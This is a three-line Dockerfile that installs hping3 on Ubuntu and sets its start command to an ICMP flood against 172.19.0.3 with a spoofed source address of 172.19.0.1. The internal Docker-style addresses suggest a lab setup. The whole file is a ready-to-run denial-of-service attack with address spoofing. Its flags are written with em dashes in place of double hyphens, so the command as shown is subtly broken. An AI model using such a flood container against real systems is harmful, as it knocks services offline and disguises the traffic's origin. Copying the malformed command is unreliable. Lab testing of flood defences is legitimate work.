FROM ubuntu 
RUN apt-get update && apt-get install -y hping3 
CMD hping3 — icmp — flood 172.19.0.3 -a 172.19.0.1
